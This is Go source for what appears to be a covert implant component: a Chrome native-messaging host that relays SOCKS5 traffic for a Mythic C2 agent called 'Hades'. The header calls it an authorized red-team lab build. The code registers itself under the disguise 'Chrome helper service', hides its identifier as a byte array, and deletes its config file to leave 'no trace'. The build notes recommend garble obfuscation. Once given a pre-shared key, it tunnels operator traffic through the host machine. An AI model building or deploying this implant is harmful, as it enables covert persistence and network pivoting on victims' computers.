// For Lab Use Only — Authorized Red Team Research (Zoom SOW 2026-2030)
// Build (requires garble for full obfuscation):
//   garble -seed=random build -ldflags="-s -w -X main.PSK=<hex> -X main.ExtID=<id>" -trimpath .
// Without garble:
//   go build -ldflags="-s -w -X main.PSK=<hex> -X main.ExtID=<id>" -trimpath .
//
// No command-line arguments. PSK and extension ID are injected at link time.
// Binary self-registers on first run and is inert until Hades sends the PSK.
// All TCP is driven by the extension — no autonomous outbound or listening socket.
package main

import (
	"bufio"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

// PSK is injected at link time: -X main.PSK=...
// ExtID is NOT compiled in — it is discovered at runtime from a config file
// written by the socks_prepare command (extension writes its own ID to disk).
var PSK = "NATIVE_PSK_PLACEHOLDER"

var hostName = func() string {
	b := []byte{99, 111, 109, 46, 104, 97, 100, 101, 115, 46, 115, 111, 99, 107, 115, 53}
	return string(b) // "com.hades.socks5"
}()

// ── Wire types ────────────────────────────────────────────────────────────────

type msgIn struct {
	Type    string `json:"type"`
	PSK     string `json:"psk,omitempty"`
	ConnID  int64  `json:"conn_id,omitempty"`
	DataB64 string `json:"data_b64,omitempty"`
}

type msgOut struct {
	Type    string `json:"type"`
	OK      bool   `json:"ok,omitempty"`
	ConnID  int64  `json:"conn_id,omitempty"`
	DataB64 string `json:"data_b64,omitempty"`
	Error   string `json:"error,omitempty"`
}

// ── I/O ───────────────────────────────────────────────────────────────────────

var wMu sync.Mutex

func send(v any) {
	data, err := json.Marshal(v)
	if err != nil {
		return
	}
	var lb [4]byte
	binary.LittleEndian.PutUint32(lb[:], uint32(len(data)))
	wMu.Lock()
	os.Stdout.Write(lb[:])
	os.Stdout.Write(data)
	wMu.Unlock()
}

func recvLoop(ch chan<- msgIn, done chan<- struct{}) {
	r := bufio.NewReader(os.Stdin)
	for {
		var lb [4]byte
		if _, err := io.ReadFull(r, lb[:]); err != nil {
			close(done)
			return
		}
		n := binary.LittleEndian.Uint32(lb[:])
		if n > 1<<20 {
			close(done)
			return
		}
		buf := make([]byte, n)
		if _, err := io.ReadFull(r, buf); err != nil {
			close(done)
			return
		}
		var m msgIn
		if json.Unmarshal(buf, &m) == nil {
			ch <- m
		}
	}
}

// ── SOCKS5 session pool ───────────────────────────────────────────────────────
// Each Mythic server_id maps to one half of a net.Pipe().
// A goroutine on the other half runs the full SOCKS5 state machine and the
// subsequent TCP relay. Incoming bytes from Mythic are written into the pipe;
// data from the remote TCP server is read and sent back to Mythic.

var sessions sync.Map // int64 → *session

type session struct {
	pw io.WriteCloser // write Mythic→target bytes here
}

func newSession(connID int64) *session {
	// clientSide: we write Mythic bytes here, read SOCKS5 responses from here
	// serverSide: the SOCKS5 goroutine reads requests / writes responses
	clientSide, serverSide := net.Pipe()

	sess := &session{pw: clientSide}
	sessions.Store(connID, sess)

	go func() {
		defer func() {
			clientSide.Close()
			serverSide.Close()
			sessions.Delete(connID)
			send(msgOut{Type: "socks_close", ConnID: connID})
		}()
		runSOCKS5(connID, serverSide)
	}()

	// Forward data from the SOCKS5/TCP goroutine back to Mythic
	go func() {
		buf := make([]byte, 32*1024)
		for {
			n, err := clientSide.Read(buf)
			if n > 0 {
				send(msgOut{
					Type:    "socks_data",
					ConnID:  connID,
					DataB64: base64.StdEncoding.EncodeToString(buf[:n]),
				})
			}
			if err != nil {
				return
			}
		}
	}()

	return sess
}

// runSOCKS5 speaks the SOCKS5 protocol on conn, then relays to the real target.
func runSOCKS5(connID int64, conn net.Conn) {
	r := bufio.NewReader(conn)

	// ── Step 1: Greeting ──
	hdr := make([]byte, 2)
	if _, err := io.ReadFull(r, hdr); err != nil || hdr[0] != 5 {
		return
	}
	methods := make([]byte, hdr[1])
	io.ReadFull(r, methods)
	conn.Write([]byte{5, 0}) // no-auth accepted

	// ── Step 2: Request ──
	req := make([]byte, 4)
	if _, err := io.ReadFull(r, req); err != nil || req[0] != 5 || req[1] != 1 {
		conn.Write([]byte{5, 7, 0, 1, 0, 0, 0, 0, 0, 0})
		return
	}

	var host string
	switch req[3] {
	case 1: // IPv4
		a := make([]byte, 4)
		io.ReadFull(r, a)
		host = fmt.Sprintf("%d.%d.%d.%d", a[0], a[1], a[2], a[3])
	case 3: // domain
		lb := make([]byte, 1)
		io.ReadFull(r, lb)
		d := make([]byte, int(lb[0]))
		io.ReadFull(r, d)
		host = string(d)
	case 4: // IPv6
		a := make([]byte, 16)
		io.ReadFull(r, a)
		host = fmt.Sprintf("[%x:%x:%x:%x:%x:%x:%x:%x]",
			a[0:2], a[2:4], a[4:6], a[6:8], a[8:10], a[10:12], a[12:14], a[14:16])
	default:
		conn.Write([]byte{5, 8, 0, 1, 0, 0, 0, 0, 0, 0})
		return
	}

	pb := make([]byte, 2)
	io.ReadFull(r, pb)
	port := int(pb[0])<<8 | int(pb[1])

	// ── Step 3: Dial target ──
	target, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 15*time.Second)
	if err != nil {
		conn.Write([]byte{5, 4, 0, 1, 0, 0, 0, 0, 0, 0}) // host unreachable
		return
	}
	defer target.Close()
	conn.Write([]byte{5, 0, 0, 1, 0, 0, 0, 0, 0, 0}) // success

	// ── Step 4: Bidirectional relay ──
	var wg sync.WaitGroup
	wg.Add(2)
	go func() { defer wg.Done(); io.Copy(target, r) }() // Mythic → target (buffered reader has remaining bytes)
	go func() { defer wg.Done(); io.Copy(conn, target) }() // target → Mythic
	wg.Wait()
}

// ── Self-install ──────────────────────────────────────────────────────────────

type nativeManifest struct {
	Name           string   `json:"name"`
	Description    string   `json:"description"`
	Path           string   `json:"path"`
	Type           string   `json:"type"`
	AllowedOrigins []string `json:"allowed_origins"`
}

func manifestPath() string {
	self, _ := os.Executable()
	self, _ = filepath.Abs(self)
	switch runtime.GOOS {
	case "darwin":
		home, _ := os.UserHomeDir()
		return filepath.Join(home, "Library", "Application Support",
			"Google", "Chrome", "NativeMessagingHosts", hostName+".json")
	case "linux":
		home, _ := os.UserHomeDir()
		return filepath.Join(home, ".config", "google-chrome",
			"NativeMessagingHosts", hostName+".json")
	default:
		self, _ := os.Executable()
		return filepath.Join(filepath.Dir(self), hostName+".json")
	}
}

// configFilePaths returns candidate locations where the extension may have
// written its ID via chrome.downloads (socks_prepare command).
func configFilePaths() []string {
	home, _ := os.UserHomeDir()
	var paths []string
	switch runtime.GOOS {
	case "darwin":
		paths = []string{
			filepath.Join(home, "Downloads", ".svc.dat"),
			filepath.Join(home, "Desktop",   ".svc.dat"),
			filepath.Join(home, ".svc.dat"),
		}
	case "linux":
		paths = []string{
			filepath.Join(home, "Downloads", ".svc.dat"),
			filepath.Join(home, ".svc.dat"),
		}
	default: // windows
		local := os.Getenv("LOCALAPPDATA")
		paths = []string{
			filepath.Join(local, ".svc.dat"),
			filepath.Join(home, "Downloads", ".svc.dat"),
			filepath.Join(home, ".svc.dat"),
		}
	}
	return paths
}

func readExtID() string {
	for _, p := range configFilePaths() {
		if b, err := os.ReadFile(p); err == nil {
			id := strings.TrimSpace(string(b))
			if len(id) == 32 {
				// Consume the file after reading — no trace left
				os.Remove(p)
				return id
			}
		}
	}
	return ""
}

func ensureInstalled() {
	mp := manifestPath()

	// Check if already installed with a valid (non-placeholder) extension ID
	if data, err := os.ReadFile(mp); err == nil {
		var existing nativeManifest
		if json.Unmarshal(data, &existing) == nil &&
			len(existing.AllowedOrigins) > 0 &&
			!strings.Contains(existing.AllowedOrigins[0], "00000000") {
			return // manifest looks valid
		}
	}

	// Try to read the extension ID from the config file dropped by socks_prepare
	extID := readExtID()
	if extID == "" {
		// No config file yet — install a placeholder manifest.
		// Chrome won't launch us until socks_prepare is run and re-registration happens.
		extID = "00000000000000000000000000000000"
	}

	self, _ := os.Executable()
	self, _ = filepath.Abs(self)
	m := nativeManifest{
		Name:           hostName,
		Description:    "Chrome helper service",
		Path:           self,
		Type:           "stdio",
		AllowedOrigins: []string{"chrome-extension://" + extID + "/"},
	}
	data, _ := json.MarshalIndent(m, "", "  ")
	os.MkdirAll(filepath.Dir(mp), 0755)
	switch runtime.GOOS {
	case "darwin", "linux":
		os.WriteFile(mp, data, 0644)
		os.Chmod(self, 0755)
	case "windows":
		os.WriteFile(mp, data, 0644)
		registryInstall(mp)
	}
}

// ── Main ──────────────────────────────────────────────────────────────────────

func main() {
	ensureInstalled()

	// Detect Chrome launch vs direct execution (3 s timeout on first byte)
	os.Stdin.SetReadDeadline(time.Now().Add(3 * time.Second))
	var probe [1]byte
	_, err := os.Stdin.Read(probe[:])
	os.Stdin.SetReadDeadline(time.Time{})
	if err != nil {
		return
	}
	var rest [3]byte
	if _, err := io.ReadFull(os.Stdin, rest[:]); err != nil {
		return
	}
	firstLen := binary.LittleEndian.Uint32([]byte{probe[0], rest[0], rest[1], rest[2]})
	if firstLen > 1<<20 {
		return
	}
	firstBuf := make([]byte, firstLen)
	if _, err := io.ReadFull(os.Stdin, firstBuf); err != nil {
		return
	}

	msgCh := make(chan msgIn, 64)
	done := make(chan struct{})
	go recvLoop(msgCh, done)

	var firstMsg msgIn
	if json.Unmarshal(firstBuf, &firstMsg) == nil {
		msgCh <- firstMsg
	}

	activated := false

	for {
		select {
		case <-done:
			// Cleanup all open sessions
			sessions.Range(func(k, v any) bool {
				v.(*session).pw.Close()
				return true
			})
			return

		case msg := <-msgCh:
			if !activated {
				if msg.Type == "activate" && msg.PSK == PSK {
					activated = true
					send(msgOut{Type: "activated", OK: true})
				}
				continue
			}

			switch msg.Type {
			case "socks_data":
				raw, err := base64.StdEncoding.DecodeString(msg.DataB64)
				if err != nil || len(raw) == 0 {
					continue
				}
				// Get or create session for this conn_id
				s, loaded := sessions.Load(msg.ConnID)
				if !loaded {
					s = newSession(msg.ConnID)
				}
				s.(*session).pw.Write(raw)

			case "socks_close":
				if s, ok := sessions.LoadAndDelete(msg.ConnID); ok {
					s.(*session).pw.Close()
				}
			}
		}
	}
}
